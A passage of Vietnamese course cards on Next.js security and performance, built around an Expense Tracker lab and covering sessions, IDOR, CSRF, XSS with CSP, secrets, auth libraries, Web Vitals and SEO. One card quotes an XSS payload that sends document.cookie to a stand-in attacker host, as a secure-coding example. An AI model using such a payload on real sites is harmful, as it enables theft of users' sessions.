x: "Expense Tracker hỗ trợ tiếng Việt và tiếng Anh, số tiền luôn là VND:<pre>// app/[lang]/layout.tsx\nimport { lang } from 'next/root-params';\nexport async function generateStaticParams() {\n  return [{ lang: 'vi' }, { lang: 'en' }];\n}\nexport default async function RootLayout({ children }: LayoutProps&lt;'/[lang]'&gt;) {\n  return &lt;html lang={await lang()}&gt;&lt;body&gt;{children}&lt;/body&gt;&lt;/html&gt;;\n}\n\n// lib/format.ts\nexport const formatVnd = (n: number, locale = 'vi-VN') =&gt;\n  new Intl.NumberFormat(locale, { style: 'currency', currency: 'VND' }).format(n);\n// formatVnd(1250000)          -&gt; '1.250.000 ₫'\n// formatVnd(1250000, 'en-US') -&gt; '₫1,250,000'</pre>Khi viết test so sánh chuỗi, chú ý giữa số và ký hiệu ₫ là ký tự non-breaking space chứ không phải dấu cách thường."
},
"w5k0": {
c: "Session cookie là cookie lưu định danh phiên đăng nhập, được trình duyệt tự gửi kèm request; các thuộc tính <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> quyết định JavaScript có đọc được không, có chỉ gửi qua HTTPS không, và có gửi kèm request xuất phát từ site khác không.",
e: "<ul><li><b>HttpOnly</b>: JavaScript không đọc được qua <code>document.cookie</code>, nên XSS không lấy trộm được token.</li><li><b>Secure</b>: chỉ gửi qua HTTPS.</li><li><b>SameSite</b>: <code>Lax</code> (mặc định ở trình duyệt hiện đại) gửi khi người dùng điều hướng top-level bằng GET từ site khác nhưng không gửi với POST cross-site; <code>Strict</code> không bao giờ gửi cross-site; <code>None</code> bắt buộc đi kèm <code>Secure</code>, chỉ dùng khi thật sự cần nhúng cross-site.</li></ul>Nên thêm <code>Path=/</code>, thời hạn rõ ràng, và có thể dùng tiền tố <code>__Host-</code> để khóa cookie vào đúng domain. Hai cách lưu phiên: <b>JWT stateless</b> (token đã ký hoặc mã hóa, chứa userId và hạn dùng; không cần tra DB mỗi request nhưng khó thu hồi trước hạn, đổi quyền phải chờ token hết hạn) và <b>session trong DB</b> (cookie chỉ chứa id ngẫu nhiên; thu hồi được ngay, xem được danh sách thiết bị, đổi lại mỗi request phải tra DB hoặc Redis). Không lưu token đăng nhập trong <code>localStorage</code>.",
x: "Expense Tracker là app tài chính, cần chức năng “Đăng xuất khỏi mọi thiết bị” và khóa tài khoản ngay khi nghi ngờ, nên chọn session trong DB. Tạo session sau khi đăng nhập:<pre>import { randomBytes } from 'node:crypto';\nimport { cookies } from 'next/headers';\n\nexport async function createSession(userId: string) {\n  const id = randomBytes(32).toString('base64url');\n  const expiresAt = new Date(Date.now() + 7 * 24 * 3600 * 1000);\n  await db.session.create({ data: { id: hash(id), userId, expiresAt } });\n  (await cookies()).set('session', id, {\n    httpOnly: true, secure: true, sameSite: 'lax', path: '/', expires: expiresAt,\n  });\n}</pre>DB chỉ lưu hash của id, nên nếu DB bị lộ thì kẻ tấn công cũng không dựng lại được cookie. Nếu chọn JWT, dùng thư viện như <code>jose</code>, đặt hạn ngắn và có refresh token."
},
"w5k1": {
c: "Data Access Layer (DAL) là một lớp code chỉ chạy trên server, gom mọi truy cập dữ liệu về một chỗ: nó xác thực session, kiểm tra quyền và trả về DTO (object tối thiểu, an toàn) cho phần render thay vì record thô từ DB.",
e: "<ul><li><b>verifySession()</b>: đọc cookie, giải mã hoặc tra session, chưa đăng nhập thì <code>redirect('/login')</code>. Bọc bằng <code>React.cache</code> để layout, page và các component gọi trong cùng một request chỉ kiểm tra một lần.</li><li><b><code>import 'server-only'</code></b> ở đầu file DAL: nếu lỡ import từ Client Component, build báo lỗi ngay thay vì âm thầm kéo code DB và secret vào bundle.</li><li><b>DTO</b>: hàm DAL trả đúng những field UI cần (<code>{ id, amount, note }</code>), không trả <code>passwordHash</code> hay ghi chú nội bộ, vì mọi thứ truyền vào Client Component đều nằm trong HTML hoặc RSC payload.</li></ul>Chỉ DAL được đọc <code>process.env</code> chứa secret và import ORM. Mutation cũng đi qua DAL để kiểm tra quyền sở hữu ở một chỗ, file <code>'use server'</code> chỉ còn là lớp mỏng. Có thể bật thêm React Taint API (<code>experimental.taint</code>) làm lớp bảo vệ phụ, nhưng nó không thay được việc lọc DTO.",
x: "DAL của Expense Tracker:<pre>// data/auth.ts\nimport 'server-only';\nimport { cache } from 'react';\nexport const verifySession = cache(async () =&gt; {\n  const id = (await cookies()).get('session')?.value;\n  const session = id ? await db.session.findValid(hash(id)) : null;\n  if (!session) redirect('/login');\n  return { userId: session.userId, role: session.role };\n});\n// data/transactions.ts\nexport async function listMyTx(month: string) {\n  const { userId } = await verifySession();\n  const rows = await db.tx.findMany({ where: { userId, month } });\n  return rows.map(({ id, amount, category, note, date }) =&gt; ({ id, amount, category, note, date }));\n}</pre>Page chỉ gọi <code>listMyTx(month)</code>; ngoài thư mục <code>data/</code> không có file nào import <code>db</code>. Khi review code, đây là điểm dễ kiểm tra nhất."
},
"w5k2": {
c: "Trong Next.js, <code>proxy.ts</code> chỉ nên làm <i>optimistic check</i>: dựa vào việc có cookie hay không để chuyển hướng nhanh; kiểm tra quyền thật phải nằm gần dữ liệu, tức trong DAL, Server Action và Route Handler.",
e: "Proxy chạy trước mọi request khớp matcher, kể cả request prefetch của <code>&lt;Link&gt;</code>, nên truy vấn DB ở đây làm mọi lần điều hướng chậm đi và tốn chi phí. Quan trọng hơn, nó không phải ranh giới bảo mật đáng tin: matcher có thể bỏ sót đường dẫn sau khi refactor; Server Action được gửi dạng POST tới route đang dùng nó, nên route nào bị matcher loại trừ thì action ở đó cũng không đi qua proxy; và middleware từng có lỗ hổng bị vượt qua hoàn toàn (CVE-2025-29927, qua header <code>x-middleware-subrequest</code>). Layout cũng không phải chỗ kiểm tra quyền: nó không render lại khi điều hướng giữa các page con và không bảo vệ Server Action hay Route Handler. Mô hình đúng là phòng thủ nhiều lớp: proxy lo trải nghiệm (chưa có cookie thì về /login), DAL quyết định ai đọc được gì, và mỗi action, handler tự kiểm tra lại.",
x: "Khi review code: đồng nghiệp chặn <code>/admin</code> bằng proxy kiểm tra cookie <code>role=admin</code>, còn trang admin truy vấn thẳng DB. Lỗ hổng: ai cũng tự đặt được cookie <code>role=admin</code>, và Server Action xóa user trong trang đó gọi được trực tiếp. Sửa:<pre>// proxy.ts: chỉ optimistic\nexport function proxy(req: NextRequest) {\n  if (!req.cookies.has('session')) return NextResponse.redirect(new URL('/login', req.url));\n}\n\n// data/admin.ts: kiểm tra thật, dựa trên session trong DB\nexport async function requireAdmin() {\n  const s = await verifySession();\n  if (s.role !== 'admin') notFound(); // không để lộ trang admin tồn tại\n  return s;\n}</pre>Mọi hàm DAL và Server Action của khu admin đều gọi <code>requireAdmin()</code> trước khi làm việc khác."
},
"w5k3": {
c: "Mỗi Server Action được dùng trong app có một action ID và có thể bị gọi bằng một request POST tự soạn, không cần qua UI; vì vậy mỗi action phải tự làm đủ ba việc: xác thực, kiểm tra quyền trên đúng tài nguyên (chống IDOR) và validate input.",
e: "Kiểm tra quyền ở page bao quanh chỉ quyết định UI nào được render, không bảo vệ được action. Trong mỗi action: <ul><li><b>Authentication</b>: gọi <code>verifySession()</code>.</li><li><b>Authorization</b>: user này có quyền với <i>đúng tài nguyên này</i> không. IDOR (Insecure Direct Object Reference) là khi server tin id do client gửi lên, ví dụ <code>deleteTx(id)</code> xóa theo id mà không kiểm tra chủ sở hữu.</li><li><b>Validate</b>: tham số và <code>FormData</code> đều do client gửi, kể cả tham số đã bind sẵn bằng <code>.bind(null, id)</code>; parse bằng zod.</li><li><b>Giá trị trả về</b>: chỉ trả thứ UI cần.</li></ul>Next.js hỗ trợ thêm: ID khó đoán và đổi theo build, action không được dùng bị loại khỏi bundle, biến closure được mã hóa. Nhưng mã hóa closure không phải chỗ để giấu secret, và action không có rate limit sẵn, cần tự thêm cho thao tác tốn tài nguyên.",
x: "Lab tuần 5 yêu cầu test chứng minh user A không xóa được giao dịch của user B. So sánh action sai và đúng:<pre>// Sai: tin id từ client\nexport async function deleteTx(id: string) {\n  await db.tx.delete({ where: { id } });\n}\n\n// Đúng\nexport async function deleteTx(input: unknown) {\n  const { id } = z.object({ id: z.uuid() }).parse(input);\n  const { userId } = await verifySession();\n  const { count } = await db.tx.deleteMany({ where: { id, userId } });\n  if (count === 0) return { error: 'Không tìm thấy giao dịch' };\n  updateTag(`summary:${userId}`);\n  return { ok: true };\n}</pre>Đặt điều kiện <code>userId</code> ngay trong câu lệnh xóa giúp tránh race giữa bước kiểm tra và bước xóa; trả cùng một thông báo cho cả “không tồn tại” lẫn “không phải của bạn” để không lộ thông tin."
},
"w5k4": {
c: "CSRF (Cross-Site Request Forgery) là kiểu tấn công lừa trình duyệt của nạn nhân gửi request kèm cookie đăng nhập tới site của bạn từ một trang độc hại; Next.js chống CSRF cho Server Action bằng cách chỉ nhận POST và so header <code>Origin</code> với <code>Host</code> (hoặc <code>X-Forwarded-Host</code>).",
e: "Trang độc hại có thể đặt sẵn một <code>&lt;form method='post'&gt;</code> trỏ tới site của bạn và tự submit; trình duyệt gửi kèm cookie nếu SameSite cho phép. Các lớp phòng thủ: <ul><li>Cookie <code>SameSite=Lax</code> (mặc định) đã chặn việc gửi cookie với POST cross-site.</li><li>Server Action chỉ chạy với POST, và Next.js hủy request nếu <code>Origin</code> khác host đang phục vụ trang, nên action chỉ gọi được từ cùng host.</li><li>Khi chạy sau reverse proxy hoặc khi domain công khai khác host nội bộ, khai báo <code>experimental.serverActions.allowedOrigins</code> (hỗ trợ wildcard như <code>*.my-proxy.com</code>) thay vì tìm cách tắt kiểm tra.</li></ul>Route Handler <b>không</b> có kiểm tra này: endpoint POST dựa trên cookie phải tự kiểm tra Origin hoặc dùng CSRF token. Và đừng bao giờ thay đổi dữ liệu trong handler GET hay trong lúc render; Next.js chặn set cookie và revalidate trong render cũng vì lý do này.",
x: "Sự cố khi đưa Expense Tracker ra sau CDN: domain công khai <code>money.example.vn</code> trỏ về origin <code>app-internal.example.net</code>, và mọi form báo lỗi vì Origin không khớp host. Cách đúng là cấu hình proxy chuyển đúng <code>X-Forwarded-Host</code>, hoặc khai báo origin hợp lệ:<pre>// next.config.ts\nconst nextConfig: NextConfig = {\n  experimental: {\n    serverActions: { allowedOrigins: ['money.example.vn'] },\n  },\n};\n\n// Route Handler POST dùng cookie: tự kiểm tra Origin\nconst origin = req.headers.get('origin');\nif (origin !== process.env.APP_ORIGIN) return new Response(null, { status: 403 });</pre>Câu hỏi hay gặp: “Server Action có cần CSRF token không?” Thường là không, nhờ POST, kiểm tra Origin và SameSite; nhưng endpoint tự viết bằng Route Handler thì vẫn phải tự xử lý."
},
"w5k5": {
c: "XSS (Cross-Site Scripting) là lỗ hổng cho phép kẻ tấn công chạy script của họ trên trang của bạn, trong phiên của người dùng khác; Content Security Policy (CSP) là header giới hạn nguồn script/style được phép chạy, và nonce là chuỗi ngẫu nhiên sinh mỗi request để đánh dấu script hợp lệ.",
e: "React escape mọi giá trị trong JSX, nên XSS trong app Next.js chủ yếu đến từ: <code>dangerouslySetInnerHTML</code> với nội dung người dùng (phải sanitize bằng DOMPurify hoặc sanitize-html theo allowlist); URL người dùng nhập đưa vào <code>href</code>/<code>src</code> (chặn <code>javascript:</code>, chỉ cho <code>http(s)</code>); JSON nhúng vào thẻ <code>&lt;script&gt;</code> mà không escape <code>&lt;</code>; script bên thứ ba. <b>CSP với nonce</b>: <code>proxy.ts</code> sinh nonce mới cho mỗi request, đưa vào header <code>Content-Security-Policy</code> (<code>script-src 'nonce-...' 'strict-dynamic'</code>) và header request <code>x-nonce</code>; Next.js tự đọc nonce trong header CSP và gắn vào script của framework; Server Component đọc <code>x-nonce</code> qua <code>headers()</code> để truyền cho <code>&lt;Script nonce&gt;</code>. Đánh đổi lớn: nonce buộc mọi trang render động, mất static và ISR, không dùng được với PPR. Muốn giữ trang tĩnh thì cân nhắc CSP dựa trên hash (SRI, còn experimental) hoặc CSP không dùng nonce.",
x: "Expense Tracker cho ghi chú giao dịch có định dạng (đậm, link), lưu dạng HTML. Một user nhập <code>&lt;img src=x onerror=fetch('//evil.io?c='+document.cookie)&gt;</code>; nếu render thẳng, ai xem giao dịch được chia sẻ cũng bị chạy script. Sửa:<pre>import DOMPurify from 'isomorphic-dompurify';\n\nexport function RichNote({ html }: { html: string }) {\n  const clean = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'],\n    ALLOWED_ATTR: ['href'],\n  });\n  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;\n}</pre>CSP <code>script-src 'self' 'nonce-…' 'strict-dynamic'</code> là lớp thứ hai: kể cả khi payload lọt qua, event handler inline và script không có nonce đều bị chặn. Cookie session là <code>HttpOnly</code> nên dù script có chạy cũng không đọc được nó."
},
"w5k6": {
c: "Biến môi trường trong Next.js mặc định chỉ có trên server; biến có tiền tố <code>NEXT_PUBLIC_</code> được thay thẳng bằng giá trị thật vào bundle JavaScript lúc <code>next build</code>, nên bất kỳ ai cũng đọc được trong trình duyệt.",
e: "Next.js nạp <code>.env</code>, <code>.env.local</code>, <code>.env.development</code>, <code>.env.production</code> theo thứ tự ưu tiên; <code>.env.local</code> không được commit và không được nạp khi chạy test. Hệ quả của việc inline lúc build: <ul><li>Không bao giờ đặt secret (API key có quyền ghi, chuỗi kết nối DB, secret webhook) với tiền tố <code>NEXT_PUBLIC_</code>.</li><li>Đổi giá trị public phải build lại; một Docker image dùng cho nhiều môi trường không đổi được <code>NEXT_PUBLIC_API_URL</code> lúc chạy. Cách xử lý: đọc biến phía server lúc runtime (sau <code>connection()</code> hoặc trong code đã là dynamic) rồi truyền xuống client qua props.</li><li>Chỉ cách viết tĩnh <code>process.env.NEXT_PUBLIC_X</code> mới được thay; <code>process.env[name]</code> thì không.</li></ul>Nên validate biến môi trường khi khởi động bằng zod (hoặc t3-env) để thiếu biến thì lỗi ngay, và chỉ DAL được đọc secret.",
x: "Sự cố thật: dev đặt <code>NEXT_PUBLIC_OPENAI_KEY</code> để gọi AI tóm tắt chi tiêu thẳng từ client cho nhanh; vài ngày sau key bị lạm dụng vì nằm ngay trong file JS công khai. Cách đúng là gọi qua server:<pre>// .env.local\nOPENAI_API_KEY=sk-...                # chỉ server\nNEXT_PUBLIC_APP_NAME=Expense Tracker\n\n// app/actions/summarize.ts\n'use server';\nexport async function summarize(month: string) {\n  const { userId } = await verifySession();\n  await rateLimit(userId);\n  return callModel(process.env.OPENAI_API_KEY!, await getMonthTx(userId, month));\n}</pre>Sau sự cố phải thu hồi key cũ ngay; xóa khỏi code là chưa đủ vì các bản build và cache CDN cũ vẫn chứa nó. Có thể thêm bước CI grep thư mục <code>.next/static</code> để tìm chuỗi giống secret."
},
"w5k7": {
c: "Auth.js (trước là NextAuth.js), Better Auth và Clerk là các lựa chọn xác thực phổ biến cho Next.js; OAuth 2.0 (thường đi kèm OpenID Connect) là giao thức cho phép đăng nhập qua nhà cung cấp như Google, GitHub mà app không phải giữ mật khẩu.",
e: "<ul><li><b>Auth.js</b>: được đội Better Auth tiếp quản từ 09/2025; người dùng hiện tại vẫn nhận bản vá bảo mật, nhưng dự án mới được khuyên bắt đầu với Better Auth.</li><li><b>Better Auth</b>: thư viện TypeScript tự host, lưu user và session trong DB của bạn (adapter cho Prisma, Drizzle); có email/password, OAuth, và plugin cho 2FA, passkey, organization.</li><li><b>Clerk</b> (cùng nhóm với Auth0, WorkOS): dịch vụ có sẵn UI, quản lý user, SSO doanh nghiệp; tích hợp nhanh nhưng tính phí theo số user, phụ thuộc nhà cung cấp, và dữ liệu user nằm bên ngoài.</li><li><b>OAuth</b>: dùng Authorization Code flow kèm PKCE; tham số <code>state</code> chống CSRF ở bước callback; chỉ liên kết tài khoản theo email khi <code>email_verified</code> là true; redirect URI khai báo chính xác.</li></ul>Khi được hỏi “chọn gì”, câu trả lời tốt nêu ràng buộc: chi phí, nơi lưu dữ liệu, nhu cầu SSO, đội có muốn tự vận hành không. Chọn gì thì kiểm tra quyền trong DAL vẫn là việc của bạn.",
x: "Lab tuần 5 dùng Better Auth: một Route Handler nhận mọi request <code>/api/auth/*</code>, DAL đọc session từ header của request:<pre>// lib/auth.ts\nexport const auth = betterAuth({\n  database: prismaAdapter(prisma, { provider: 'postgresql' }),\n  emailAndPassword: { enabled: true },\n  socialProviders: { google: { clientId: process.env.GOOGLE_ID!, clientSecret: process.env.GOOGLE_SECRET! } },\n});\n// app/api/auth/[...all]/route.ts\nexport const { GET, POST } = toNextJsHandler(auth);\n\n// data/auth.ts\nexport const verifySession = cache(async () =&gt; {\n  const s = await auth.api.getSession({ headers: await headers() });\n  if (!s) redirect('/login');\n  return { userId: s.user.id };\n});</pre>Phần còn lại của app không phụ thuộc thư viện auth: đổi sang giải pháp khác chỉ cần sửa <code>verifySession</code>."
},
"w5k8": {
c: "Prisma và Drizzle là ORM TypeScript để truy vấn DB có type; rate limit là giới hạn số request trong một khoảng thời gian để chống lạm dụng; BFF (Backend for Frontend) là mô hình server Next.js đứng giữa trình duyệt và backend riêng, gọi API thay cho client.",
e: "<ul><li><b>Prisma</b>: schema riêng (<code>schema.prisma</code>), client được sinh ra, migration tốt, dễ dùng. <b>Drizzle</b>: schema viết bằng TypeScript, API gần với SQL, nhẹ, hợp serverless. Dù chọn gì: chỉ dùng một client instance (giữ trên <code>globalThis</code> để hot reload ở dev không tạo kết nối mới liên tục), dùng connection pooling khi chạy serverless, và tránh truy vấn N+1.</li><li><b>Rate limit</b>: áp cho đăng nhập, gửi OTP, Server Action tốn tài nguyên; khóa theo userId hoặc IP; lưu bộ đếm trong Redis (ví dụ Upstash) hoặc làm ở tầng hạ tầng (WAF, reverse proxy), vì bộ đếm trong bộ nhớ sai khi chạy nhiều instance.</li><li><b>BFF</b>: khi đã có backend (NestJS, Spring, Go), Next.js giữ access token trong cookie httpOnly; Server Component và Server Action gọi backend từ server kèm token; refresh token cũng xử lý ở server. Trình duyệt không thấy token và không cần cấu hình CORS. Khi Client Component cần gọi, dùng Route Handler làm proxy.</li></ul>",
x: "Expense Tracker gọi core banking API do team Go phát triển. DAL đóng vai BFF:<pre>// data/backend.ts\nimport 'server-only';\nexport async function api&lt;T&gt;(path: string, init?: RequestInit): Promise&lt;T&gt; {\n  const token = (await cookies()).get('access_token')?.value;\n  if (!token) redirect('/login');\n  const res = await fetch(`${process.env.CORE_API_URL}${path}`, {\n    ...init,\n    headers: { ...init?.headers, Authorization: `Bearer ${token}` },\n  });\n  if (res.status === 401) redirect('/login?expired=1');\n  if (!res.ok) throw new Error(`Core API ${res.status}`);\n  return res.json() as Promise&lt;T&gt;;\n}</pre>Action <code>exportReport</code> gọi <code>ratelimit.limit(userId)</code> (Upstash, 5 lần mỗi giờ) trước khi gọi <code>api('/reports')</code>. Việc làm mới token khi gặp 401 cũng nên đặt trong hàm này để các trang không phải lo."
},
"w6k0": {
c: "Core Web Vitals là ba chỉ số Google dùng để đo trải nghiệm thực tế: LCP (tốc độ hiện nội dung chính), INP (độ phản hồi khi tương tác) và CLS (độ ổn định bố cục); ngưỡng “tốt” là LCP ≤ 2,5 s, INP ≤ 200 ms, CLS ≤ 0,1, tính ở phân vị 75 (p75) của người dùng thật.",
e: "<ul><li><b>LCP</b>: thời điểm phần tử ảnh hoặc khối chữ lớn nhất trong viewport hiển thị. Có thể tách thành TTFB, độ trễ bắt đầu tải tài nguyên, thời gian tải và độ trễ render; thường kém vì ảnh hero tải muộn, TTFB cao, CSS hoặc font chặn render.</li><li><b>INP</b> (thay FID từ 12/03/2024): lấy gần như tương tác chậm nhất trong cả phiên (click, chạm, gõ phím), tính từ lúc tương tác tới lần paint tiếp theo, gồm độ trễ đầu vào, thời gian xử lý và độ trễ hiển thị. FID chỉ đo độ trễ đầu vào của tương tác đầu tiên nên dễ cho kết quả đẹp giả.</li><li><b>CLS</b>: tổng điểm dịch chuyển bố cục lớn nhất trong một “cửa sổ phiên”; nguyên nhân thường là ảnh không có kích thước, banner chèn lên trên nội dung, font đổi kích thước khi tải xong.</li></ul>“p75” nghĩa là 75% lượt xem phải đạt ngưỡng, xét riêng mobile và desktop. Công cụ lab như Lighthouse không đo được INP thật vì không có người tương tác; TBT chỉ là chỉ báo gián tiếp.",
x: "Dữ liệu CrUX của dashboard Expense Tracker trên mobile: LCP 3,4 s, INP 380 ms, CLS 0,22. Xử lý từng chỉ số:<ul><li><b>LCP</b>: phần tử LCP là ảnh banner khuyến mãi nhưng đang lazy load; đổi sang <code>fetchPriority='high'</code> và <code>loading='eager'</code>, đặt <code>sizes</code> đúng, đưa phần tĩnh vào static shell để giảm TTFB.</li><li><b>INP</b>: bấm “Lọc” chạy lọc 10.000 dòng đồng bộ trên main thread; chuyển việc lọc lên server qua URL, hoặc dùng <code>useDeferredValue</code> và virtualize bảng.</li><li><b>CLS</b>: biểu đồ tải sau đẩy bảng xuống; đặt chiều cao cố định cho skeleton.</li></ul>Bằng chứng cải thiện là dữ liệu người dùng thật sau khi deploy (RUM của mình ngay lập tức, CrUX sau chu kỳ 28 ngày); điểm Lighthouse 100 không chứng minh được gì về INP."
},
"w6k1": {
c: "<code>next/image</code>, <code>next/font</code> và <code>next/script</code> là ba công cụ có sẵn để tải ảnh, font và script bên thứ ba một cách tối ưu, đồng thời giữ bố cục ổn định để tránh CLS.",
e: "<ul><li><b>next/image</b>: bắt buộc <code>width</code>/<code>height</code> (hoặc <code>fill</code> trong khung đã có kích thước) để trình duyệt giữ chỗ trước. <code>sizes</code> cho biết ảnh chiếm bao nhiêu chiều rộng viewport; thiếu nó, ảnh responsive sẽ tải bản quá lớn. Ảnh lazy load mặc định. Prop <code>priority</code> đã <b>deprecated từ Next.js 16</b>, thay bằng <code>preload</code>; docs khuyên trong đa số trường hợp nên dùng <code>loading='eager'</code> hoặc <code>fetchPriority='high'</code> cho ảnh LCP. Cũng từ 16, <code>images.qualities</code> mặc định chỉ còn <code>[75]</code>.</li><li><b>next/font</b>: tự host font lúc build, tự preload, tạo font fallback có <code>size-adjust</code> để chữ không nhảy khi font thật tải xong; dùng option <code>variable</code> để nối với Tailwind.</li><li><b>next/script</b>: <code>strategy</code> gồm <code>beforeInteractive</code> (hiếm, cho script bắt buộc chạy trước hydrate), <code>afterInteractive</code> (mặc định, hợp với analytics), <code>lazyOnload</code> (chat widget, tải khi trình duyệt rảnh).</li></ul>",
x: "Trang giới thiệu công khai của Expense Tracker: ảnh hero là phần tử LCP, widget chat hỗ trợ tải sau:<pre>import Image from 'next/image';\nimport Script from 'next/script';\nimport hero from './hero.webp'; // static import: tự có width/height và blur\n\nexport default function Landing() {\n  return (\n    &lt;&gt;\n      &lt;Image src={hero} alt='Bảng chi tiêu theo tháng' fetchPriority='high'\n        loading='eager' sizes='(max-width: 768px) 100vw, 1200px' placeholder='blur' /&gt;\n      &lt;Script src='https://chat.example.com/widget.js' strategy='lazyOnload' /&gt;\n    &lt;/&gt;\n  );\n}</pre>Avatar lấy từ CDN ngoài cần khai báo <code>images.remotePatterns</code>. Đừng đặt ưu tiên cao cho nhiều ảnh cùng lúc, vì chúng sẽ tranh băng thông với nhau và với chính ảnh LCP."
},
"w6k2": {
c: "Giảm JavaScript phía client là giảm lượng code trình duyệt phải tải, parse, chạy và hydrate; trong App Router, cách hiệu quả nhất là giữ code ở Server Component, đẩy <code>'use client'</code> xuống component lá, lazy load phần ít dùng và đo bằng bundle analyzer.",
e: "<ul><li><b>Đẩy 'use client' xuống lá</b>: đặt directive ở layout hay page sẽ kéo cả cây con và mọi thư viện được import vào bundle. Tách phần tương tác (nút, dropdown) thành file client nhỏ, phần còn lại giữ là server.</li><li><b>Thư viện nặng chạy ở server</b>: markdown, highlight code (shiki), xử lý ngày, biến đổi dữ liệu; client chỉ nhận HTML.</li><li><b>Dynamic import</b>: <code>next/dynamic</code> cho component nặng chưa cần ngay (biểu đồ, editor, bản đồ), có thể thêm <code>ssr: false</code> khi gọi trong Client Component; hoặc <code>await import()</code> ngay trong event handler (xuất Excel khi bấm nút).</li><li><b>Đo</b>: <code>next analyze</code> (Turbopack Bundle Analyzer, có từ 16.1; 16.4 thêm trang tổng hợp route nặng nhất, snapshot và so sánh), hoặc <code>@next/bundle-analyzer</code> nếu build bằng webpack; thêm tab Coverage của DevTools.</li></ul>Kiểm tra thêm <code>optimizePackageImports</code> cho thư viện icon có nhiều export và các script bên thứ ba. Next.js 16 đã bỏ cột “First Load JS” trong output của build vì không chính xác với RSC.",
x: "Bundle trang <code>/reports</code> của Expense Tracker nặng bất thường vì page có <code>'use client'</code> và import cả <code>xlsx</code> (để xuất file) lẫn thư viện biểu đồ. Sau khi chạy <code>npx next analyze</code>, sửa theo hướng: page trở lại Server Component, biểu đồ lazy load, thư viện Excel chỉ tải khi bấm:<pre>// page.tsx: bỏ 'use client', số liệu tính ở server\nconst Chart = dynamic(() =&gt; import('./category-chart'), { loading: () =&gt; &lt;ChartSkeleton /&gt; });\n\n// export-button.tsx\n'use client';\nexport function ExportButton({ rows }: { rows: ReportRow[] }) {\n  async function onClick() {\n    const XLSX = await import('xlsx');\n    const wb = XLSX.utils.book_new();\n    XLSX.utils.book_append_sheet(wb, XLSX.utils.json_to_sheet(rows), 'Report');\n    XLSX.writeFile(wb, 'bao-cao.xlsx');\n  }\n  return &lt;button onClick={onClick}&gt;Xuất Excel&lt;/button&gt;;\n}</pre>Kiểm chứng bằng <code>next analyze --output</code> trước và sau khi sửa rồi so sánh hai snapshot."
},
"w6k3": {
c: "Đo hiệu năng có hai loại dữ liệu: dữ liệu lab (Lighthouse, Chrome DevTools Performance) chạy trong môi trường kiểm soát để tìm nguyên nhân, và dữ liệu người dùng thật (RUM: <code>useReportWebVitals</code>, Vercel Speed Insights, CrUX) để biết người dùng thực sự trải nghiệm thế nào.",
e: "<ul><li><b>Lighthouse</b>: chấm điểm một lần tải trang với máy và mạng giả lập; tốt để so sánh trước/sau và chặn hồi quy trong CI (Lighthouse CI), nhưng không đo được INP thật.</li><li><b>DevTools Performance</b>: ghi trace để thấy long task (trên 50 ms) trên main thread, do script nào hay lần render React nào gây ra, layout shift xảy ra ở đâu; bật CPU throttling 4x để giống máy tầm trung. Panel này cũng hiện Web Vitals trực tiếp khi bạn thao tác.</li><li><b>useReportWebVitals</b> (từ <code>next/web-vitals</code>): hook trong Client Component nhận từng chỉ số (LCP, INP, CLS, FCP, TTFB) để gửi về hệ thống analytics của bạn, thường bằng <code>navigator.sendBeacon</code>.</li><li><b>Speed Insights</b>: dịch vụ RUM của Vercel, xem theo từng route và theo p75.</li></ul>Quy trình đúng: phát hiện vấn đề từ dữ liệu thật, tái hiện bằng DevTools hoặc Lighthouse, sửa, rồi kiểm chứng lại bằng dữ liệu thật. Luôn đo bản <code>next build</code> + <code>next start</code>, không đo ở dev mode.",
x: "Gửi Web Vitals của Expense Tracker về endpoint riêng, kèm đường dẫn để biết trang nào kém:<pre>// app/web-vitals.tsx\n'use client';\nimport { useReportWebVitals } from 'next/web-vitals';\n\nexport function WebVitals() {\n  useReportWebVitals((metric) =&gt; {\n    const body = JSON.stringify({\n      name: metric.name, value: metric.value, id: metric.id, path: location.pathname,\n    });\n    navigator.sendBeacon('/api/vitals', body);\n  });\n  return null;\n}</pre>Đặt <code>&lt;WebVitals /&gt;</code> trong root layout. Khi dashboard nội bộ báo INP p75 của <code>/transactions</code> là 350 ms, mở DevTools Performance, ghi lại thao tác bấm “Lọc” với CPU 4x để tìm long task gây chậm."
},
"w6k4": {
c: "SEO trong App Router dựa trên các file và API có sẵn: Metadata API cho title, description, canonical, Open Graph; <code>sitemap.ts</code> và <code>robots.ts</code> sinh file cho crawler; JSON-LD mô tả dữ liệu có cấu trúc; <code>opengraph-image.tsx</code> sinh ảnh khi chia sẻ link.",
e: "<ul><li><b>Metadata</b>: mỗi trang có title và description riêng; <code>alternates.canonical</code> để gộp các URL trùng nội dung (query sort, utm); <code>robots: { index: false }</code> cho trang riêng tư; trả 404 thật bằng <code>notFound()</code>.</li><li><b>sitemap.ts</b>: export hàm trả mảng <code>{ url, lastModified }</code>; site lớn chia thành nhiều sitemap bằng <code>generateSitemaps</code> (từ 16, <code>id</code> nhận vào là Promise). <b>robots.ts</b>: trả về <code>rules</code> và đường dẫn sitemap.</li><li><b>JSON-LD</b>: render <code>&lt;script type='application/ld+json'&gt;</code> trong page, escape ký tự <code>&lt;</code> để tránh XSS.</li><li><b>Ảnh OG</b>: file <code>opengraph-image.tsx</code> dùng <code>ImageResponse</code> (từ <code>next/og</code>) vẽ ảnh 1200×630 từ JSX; từ 16, <code>params</code> của nó là Promise.</li></ul>Nội dung chính phải có sẵn trong HTML từ server. Với metadata được stream, Next.js nhận diện các bot không chạy JavaScript qua user agent và chờ metadata xong rồi mới gửi.",
x: "Expense Tracker có trang công khai <code>/guides/[slug]</code> (bài hướng dẫn quản lý chi tiêu) cần lên Google:<pre>// app/sitemap.ts\nexport default async function sitemap(): Promise&lt;MetadataRoute.Sitemap&gt; {\n  const guides = await getPublishedGuides();\n  return guides.map((g) =&gt; ({ url: `https://money.example.vn/guides/${g.slug}`, lastModified: g.updatedAt }));\n}\n\n// app/guides/[slug]/page.tsx (bên trong component)\nconst jsonLd = { '@context': 'https://schema.org', '@type': 'Article', headline: guide.title, datePublished: guide.publishedAt };\nreturn (\n  &lt;article&gt;\n    &lt;script type='application/ld+json'\n      dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd).replace(/&lt;/g, '\\\\u003c') }} /&gt;\n    &lt;h1&gt;{guide.title}&lt;/h1&gt;\n  &lt;/article&gt;\n);</pre>Thêm <code>app/robots.ts</code> chặn <code>/transactions</code> và <code>/api</code>; mọi trang sau đăng nhập đặt <code>robots: { index: false }</code>."
},
"w6k5": {
